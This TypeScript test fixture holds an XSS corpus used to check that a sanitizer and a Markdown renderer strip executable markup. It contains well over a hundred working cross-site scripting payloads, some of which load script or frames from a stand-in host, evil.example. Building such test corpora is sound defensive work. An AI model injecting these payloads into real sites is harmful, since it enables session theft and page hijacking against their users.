/**
 * The XSS corpus of the sanitizer (spec §9.5, K14; Phase 2 Task 8): self-written vectors, grouped by the trick they
 * try. Each one is fed to `sanitizedHtml` and to `renderMarkdown`, and the output must hold no executable markup.
 * The S7 cases (links that leave the site or run script) are in the "links" group.
 *
 * Characters that are hard to read or to keep intact in source (NUL, controls, separators, lone surrogates) are built
 * with `String.fromCharCode`.
 */

/** A file id as the `/files/<id>` rule wants it (26 Crockford base-32 characters, upper case). */
export const CORPUS_FILE_ID = '01HZY3V0ZQ7M4K2B6S9T1W8XEA';

const F = CORPUS_FILE_ID;
const ch = (code: number): string => String.fromCharCode(code);
const NUL = ch(0);
const TAB = ch(9);
const LF = ch(10);
const CR = ch(13);
const VT = ch(11);
const FF = ch(12);
const SOH = ch(1);
const ESC = ch(27);
const NBSP = ch(0xa0);
const LS = ch(0x2028);
const BOM = ch(0xfeff);
const RLO = ch(0x202e);
const LONE_HIGH = ch(0xd800);
const LONE_LOW = ch(0xdc00);
const FULLWIDTH_JAVASCRIPT = [0xff4a, 0xff41, 0xff56, 0xff41, 0xff53, 0xff43, 0xff52, 0xff49, 0xff50, 0xff54, 0xff1a]
  .map(ch)
  .join('');

/** Every character of `s` as a decimal (`&#106;`) or hex (`&#x6a;`) reference, with or without the semicolon. */
function encodeAll(s: string, form: 'dec' | 'hex' | 'dec-bare' | 'hex-padded'): string {
  return [...s]
    .map((c) => {
      const n = c.codePointAt(0)!;
      if (form === 'dec') return `&#${n};`;
      if (form === 'hex') return `&#x${n.toString(16)};`;
      if (form === 'dec-bare') return `&#${n}`;
      return `&#x${n.toString(16).padStart(7, '0')};`;
    })
    .join('');
}

/** `<script>` in its many spellings. */
const SCRIPT = [
  '<script>alert(1)</script>',
  '<SCRIPT>alert(1)</SCRIPT>',
  '<ScRiPt>alert(1)</sCrIpT>',
  '<script src="//evil.example/x.js"></script>',
  '<script src=https://evil.example/x.js>',
  '<script/xss src="//evil.example/x.js"></script>',
  '<script\n>alert(1)</script\n>',
  '<script >alert(1)</script >',
  '<script>alert(1)',
  '</script><script>alert(1)</script>',
  '<script>/*</script>*/alert(1)</script>',
  '<scr<script>ipt>alert(1)</script>',
  '<<script>alert(1)//<</script>',
  '<script><!--<script></script>-->alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  "<script>document.write('<img src=x onerror=alert(1)>')</script>",
  `<script${NUL}>alert(1)</script>`,
  `<scr${NUL}ipt>alert(1)</scr${NUL}ipt>`,
  '<script type="text/plain">alert(1)</script>',
  '<p>a<script>alert(1)</script>b</p>',
  '<script>alert(1)</script/>',
];

/** Event handler attributes, quoted, unquoted, glued and hidden. */
const HANDLERS = [
  '<img src=x onerror=alert(1)>',
  `<img src="/files/${F}" onerror="alert(1)">`,
  `<img src=/files/${F} alt="x" onload=alert(1)>`,
  '<body onload=alert(1)>',
  '<p onclick="alert(1)">x</p>',
  '<p ONCLICK=alert(1)>x</p>',
  '<a href="/x" onmouseover=alert(1)>x</a>',
  '<div onpointerenter=alert(1)>x</div>',
  '<details open ontoggle=alert(1)>x</details>',
  '<input autofocus onfocus=alert(1)>',
  '<p/onclick=alert(1)>x</p>',
  `<p onclick${TAB}=alert(1)>x</p>`,
  '<p\nonclick=alert(1)>x</p>',
  '<p "onclick=alert(1)">x</p>',
  '<p a="b"onclick=alert(1)>x</p>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<style onload=alert(1)></style>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>x</textarea>',
  '<td onmouseover=alert(1)>x</td>',
  '<strong onmouseover=alert(1)>x</strong>',
  '<table background="javascript:alert(1)" onclick=alert(1)><tr><td>x</td></tr></table>',
  '<li onclick=alert(1)>x</li>',
  '<h2 onanimationstart=alert(1) style="animation:x">x</h2>',
  '<blockquote cite="javascript:alert(1)" onfocus=alert(1)>x</blockquote>',
  `<figure onclick=alert(1)><img src="/files/${F}" alt="a"><figcaption onclick=alert(1)>c</figcaption></figure>`,
];

/** `javascript:` hidden by entities, controls, white space and case (S7). */
const JAVASCRIPT = [
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="JAVASCRIPT:alert(1)">x</a>',
  '<a href=javascript:alert(1)>x</a>',
  "<a href='javascript:alert(1)'>x</a>",
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="jav&#9;ascript:alert(1)">x</a>',
  '<a href="java&#10;script:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="java&#13;script:alert(1)">x</a>',
  '<a href="java\nscript:alert(1)">x</a>',
  `<a href="java${CR}script:alert(1)">x</a>`,
  `<a href="jav${TAB}ascript:alert(1)">x</a>`,
  `<a href="jav${NUL}ascript:alert(1)">x</a>`,
  `<a href="${SOH}javascript:alert(1)">x</a>`,
  `<a href="${ESC}${VT}${FF}javascript:alert(1)">x</a>`,
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#106avascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="&#0000106;avascript:alert(1)">x</a>',
  `<a href="${encodeAll('javascript:alert(1)', 'dec')}">x</a>`,
  `<a href="${encodeAll('javascript:alert(1)', 'hex')}">x</a>`,
  `<a href="${encodeAll('javascript:alert(1)', 'dec-bare')}">x</a>`,
  `<a href="${encodeAll('javascript:alert(1)', 'hex-padded')}">x</a>`,
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="javascript&#58;alert(1)">x</a>',
  '<a href="javascript&#x3A;alert(1)">x</a>',
  '<a href="javascript&#x3Aalert(1)">x</a>',
  '<a href="jav&Tab;ascript:alert(1)">x</a>',
  '<a href="jav&NewLine;ascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="   javascript:alert(1)   ">x</a>',
  '<a href=" &#14;  javascript:alert(1)">x</a>',
  '<a href="javas&#99;ript:alert(1)">x</a>',
  '<a href=javascript&colon;alert&lpar;1&rpar;>x</a>',
  '<a\nhref\n=\njavascript:alert(1)>x</a>',
  '<a/href=javascript:alert(1)>x</a>',
  '<a href="javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>">x</a>',
  `<img src="javascript:alert(1)" alt="x">`,
  '<img src=x:alert(alt) onerror=eval(src) alt=0>',
  '<a href="&#x26;#x6A;avascript:alert(1)">x</a>',
  `<a href="java${LS}script:alert(1)">x</a>`,
  `<a href="${BOM}javascript:alert(1)">x</a>`,
  `<a href="jav${NBSP}ascript:alert(1)">x</a>`,
  `<a href="${FULLWIDTH_JAVASCRIPT}alert(1)">x</a>`,
];

/** Other schemes that must never become a link or an image. */
const SCHEMES = [
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="VBScript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="DATA:text/html,<script>alert(1)</script>">x</a>',
  '<a href="d&#97;ta:text/html,x">x</a>',
  '<a href="  data:text/html,x">x</a>',
  '<img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;" alt="x">',
  '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">',
  '<a href="livescript:alert(1)">x</a>',
  '<a href="file:///etc/passwd">x</a>',
  '<a href="ftp://example.com/x">x</a>',
  '<a href="blob:https://example.com/x">x</a>',
  '<a href="filesystem:https://example.com/x">x</a>',
  '<a href="mocha:alert(1)">x</a>',
];

/** Links and images that leave the site, or hide where they go (S7). */
const OFF_SITE = [
  '<a href="//evil.example">x</a>',
  '<a href="/\\evil.example">x</a>',
  '<a href="\\\\evil.example">x</a>',
  '<a href="\\/evil.example">x</a>',
  `<a href="/${TAB}/evil.example">x</a>`,
  '<a href="/.//evil.example">x</a>',
  '<a href="/x/..//evil.example">x</a>',
  '<a href="/a/%2e%2e/%2e%2e//evil.example">x</a>',
  '<a href="http:evil.example">x</a>',
  '<a href="https:evil.example">x</a>',
  '<a href="https:/evil.example">x</a>',
  '<a href="http://user:pass@evil.example/">x</a>',
  '<a href="https://example.com@evil.example/">x</a>',
  '<a href="/halaman/a?b=1#c">x</a>',
  `<img src="/files/${F}/../x" alt="x">`,
  `<img src="/files/${F}/../../evil.example/x.png" alt="x">`,
  `<img src="//evil.example/files/${F}" alt="x">`,
  `<img src="https://evil.example/files/${F}" alt="x">`,
  `<img src="/files/${F.toLowerCase()}" alt="x">`,
  `<img src="/files/${F}?x=1" alt="x">`,
  `<img src="/files/${F}#x" alt="x">`,
  `<img src="/files/${F}X" alt="x">`,
  '<img src="https://evil.example/x.png" alt="x">',
  '<img alt="no source">',
  `<img src="/files/${F}" srcset="https://evil.example/x.png 2x" alt="x">`,
];

/** Elements that run, embed, restyle or redirect. */
const ELEMENTS = [
  '<iframe src="//evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe><img src=x onerror=alert(1)></iframe>',
  '<object data="//evil.example/x.swf"></object>',
  '<object data="data:text/html,<script>alert(1)</script>"><param name=x value=y></object>',
  '<embed src="//evil.example/x.swf">',
  '<applet code="x.class"></applet>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">x</text></a></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<math href="javascript:alert(1)">x</math>',
  '<base href="//evil.example/">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<link rel="stylesheet" href="//evil.example/x.css">',
  '<form action="javascript:alert(1)"><input type="submit"></form>',
  '<form><button formaction="javascript:alert(1)">x</button></form>',
  '<isindex action="javascript:alert(1)" type="image">',
  '<frameset onload=alert(1)>',
  '<template><script>alert(1)</script></template>',
  '<template><img src=x onerror=alert(1)></template>',
  '<portal src="//evil.example"></portal>',
  '<xmp><script>alert(1)</script></xmp>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<title><img src=x onerror=alert(1)></title>',
  '<textarea><script>alert(1)</script></textarea>',
  '<noembed><img src=x onerror=alert(1)></noembed>',
  '<noframes><img src=x onerror=alert(1)></noframes>',
  '<plaintext><script>alert(1)</script>',
  '<style><img src=x onerror=alert(1)></style>',
  '<video poster="javascript:alert(1)"></video>',
  '<image src=x onerror=alert(1)>',
  '<keygen autofocus onfocus=alert(1)>',
];

/** CSS, which can load, run (old engines) or cover the page. */
const STYLE = [
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<p style="width:expression(alert(1))">x</p>',
  '<style>@import "javascript:alert(1)";</style>',
  '<div style="behavior:url(x.htc)">x</div>',
  '<p STYLE=color:red>x</p>',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<p style=&#34;x&#34;>x</p>',
  `<img style="position:fixed;top:0" src="/files/${F}" alt="x">`,
  '<strong style="">x</strong>',
  '<p style="position:fixed;inset:0;z-index:9999">Masuk ulang</p>',
  '<link rel=import href="//evil.example/x.html">',
];

/** Comments, CDATA, doctypes and processing instructions that hide markup. */
const COMMENTS = [
  '<!--<img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)> -->',
  '<!--><img src=x onerror=alert(1)>-->',
  '<!---><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<!DOCTYPE html><script>alert(1)</script>',
  '<?xml version="1.0"?><script>alert(1)</script>',
  '<! foo="bar" onerror=alert(1)>',
  '<!--[if IE]><script>alert(1)</script><![endif]-->',
  '<![if !IE]><script>alert(1)</script><![endif]>',
  '</ foo="<img src=x onerror=alert(1)>">',
  '<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>',
  '<!-- unclosed <script>alert(1)</script>',
  '<?php echo "<script>alert(1)</script>"; ?>',
];

/** Broken attribute syntax that a browser still reads. */
const ATTRIBUTES = [
  `<img src="/files/${F}"onerror=alert(1)>`,
  `<img src=/files/${F}/onerror=alert(1)>`,
  '<img """><script>alert(1)</script>">',
  '<a href="/x"title="a"onclick=alert(1)>x</a>',
  `<a href='/x' title='"><script>alert(1)</script>'>x</a>`,
  '<a title="&quot;><script>alert(1)</script>">x</a>',
  '<a href=/x title=`x`onclick=alert(1)>x</a>',
  `<img src= /files/${F} onerror =alert(1)>`,
  '<a href="/x" =onclick=alert(1)>x</a>',
  '<p =onclick=alert(1)>x</p>',
  '<a href="#"onclick="alert(1)">x</a>',
  '<p <script>alert(1)</script>>x</p>',
  `<img src="/files/${F}" alt="a" alt="b" src="x">`,
  '<a href="https://example.com/" href="javascript:alert(1)">x</a>',
  '<a href="javascript:alert(1)" href="https://example.com/">x</a>',
  '<<img src=x onerror=alert(1)>>',
  '<a href="/x" title="x" title="y" onclick=alert(1) onclick=alert(2)>x</a>',
  '<p title=x onclick=alert(1)//>x</p>',
  '<a href="/x"/onclick=alert(1)>x</a>',
  '<a href=">" onclick=alert(1)>x</a>',
  `<a h${NUL}ref="javascript:alert(1)">x</a>`,
  '<a href="/x" title="<script>alert(1)</script>">x</a>',
  '<img src=`x` onerror=alert(1)>',
  '<a href="/x" title="unclosed>x</a><script>alert(1)</script>',
];

/** Unclosed and mis-nested markup, and the mutation tricks that rely on how a browser repairs it. */
const NESTING = [
  '<p><a href="/x">',
  '<table><td><script>alert(1)</script>',
  '<table><img src=x onerror=alert(1)>',
  '<a href="/x"><table><a href="javascript:alert(1)">x</a></table></a>',
  '<ul><li><svg><p><style><img src=x onerror=alert(1)>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<math><mi><svg><title><img src=x onerror=alert(1)>',
  '<noscript><img src=x onerror=alert(1)></noscript>',
  '<select><template><style><img src=x onerror=alert(1)></style></template></select>',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<table><caption><svg><style></caption><img src=x onerror=alert(1)>',
  '<p><table><tr><td>x</p><script>alert(1)</script>',
  '<pre><code><script>alert(1)</script></code></pre>',
  '<strong><em><a href="javascript:alert(1)">x</strong></em></a>',
  '<a href="/a"><a href="javascript:alert(1)">x</a></a>',
  '<ul>teks<script>alert(1)</script><li>x',
  '<li><a href="//evil.example">x</a>',
  `${'<blockquote>'.repeat(300)}<script>alert(1)</script>`,
  `${'<a href="/x">'.repeat(50)}<img src=x onerror=alert(1)>`,
  '<p>x</div></p><script>alert(1)</script>',
];

/** Text that only looks like markup: entities and other encodings stay text. */
const ENCODED = [
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '&#x3C;img src=x onerror=alert(1)&#x3E;',
  '&LT;script&GT;alert(1)&LT;/script&GT;',
  '&lt&gt;script&lt/script&gt',
  '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '&#0;<script>alert(1)</script>',
  '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
  `<img src="&#47;files&#47;${F}" alt="x">`,
  '&amp;lt;script&amp;gt;alert(1)',
  '<p>&#1114112; &#x110000; &#xD800; &#55296; &#99999999999999999999;</p>',
];

/** Unicode and control characters around markup. */
const UNICODE = [
  `<a href="https://example.com/${RLO}gnp.exe">x</a>`,
  `<p title="${LONE_HIGH}">${LONE_LOW}x${LONE_HIGH}</p>`,
  `<scr${LONE_HIGH}ipt>alert(1)</script>`,
  `<a href="/x${LONE_LOW}">x</a>`,
  `${NUL}<${NUL}script${NUL}>alert(1)${NUL}</script>`,
  `<p>${SOH}${ESC}${VT}${FF}x</p>`,
  `<img src="/files/${F}${NUL}" alt="x">`,
  `<a href="https://example.com/${CR}${LF}javascript:alert(1)">x</a>`,
];

/** A large `<img>`-only page and long runs: the output must still be clean. */
const VOLUME = [
  `${'<img src=x onerror=alert(1)>'.repeat(200)}`,
  `<p>${'a'.repeat(5000)}<script>alert(1)</script></p>`,
  `${'<'.repeat(500)}script>alert(1)</script>`,
  `${'&'.repeat(500)}#106;avascript:alert(1)`,
];

/** Every HTML vector of the corpus (≥ 150, K14). */
export const XSS_VECTORS: readonly string[] = [
  ...SCRIPT,
  ...HANDLERS,
  ...JAVASCRIPT,
  ...SCHEMES,
  ...OFF_SITE,
  ...ELEMENTS,
  ...STYLE,
  ...COMMENTS,
  ...ATTRIBUTES,
  ...NESTING,
  ...ENCODED,
  ...UNICODE,
  ...VOLUME,
];

/** Vectors in Markdown syntax: links, images, code and raw HTML inside the subset. */
export const MARKDOWN_XSS_VECTORS: readonly string[] = [
  '[x](javascript:alert(1))',
  '[x](JaVaScRiPt:alert(1))',
  '[x](jav&#x09;ascript:alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x]( javascript:alert(1) )',
  '[x](java\\script:alert(1))',
  '[x](vbscript:msgbox(1))',
  '[x](data:text/html,<script>alert(1)</script>)',
  '[x](//evil.example)',
  '[x](/\\evil.example)',
  '[x](http:evil.example)',
  '![x](data:image/png;base64,iVBORw0KGgo=)',
  '![x](https://evil.example/x.png)',
  `![x](/files/${F}/../../x)`,
  `![x](/files/${F} "a\\" onerror=\\"alert(1)")`,
  '[x](/x "\\" onclick=\\"alert(1)")',
  '<script>alert(1)</script>',
  '`<script>alert(1)</script>`',
  '```\n<script>alert(1)</script>\n```',
  '> <img src=x onerror=alert(1)>',
  '| <script>alert(1)</script> | x |\n|---|---|\n| <img src=x onerror=alert(1)> | y |',
  '[<img src=x onerror=alert(1)>](/x)',
  '**<svg onload=alert(1)>**',
  '- <iframe src="//evil.example"></iframe>\n  - <object data=x></object>',
  '# <style>body{display:none}</style>',
  '[a](/x)[b](javascript:alert(1))',
  '![<script>](/files/x)',
  '[x](/x "<script>alert(1)</script>")',
  '\\<script>alert(1)\\</script>',
];
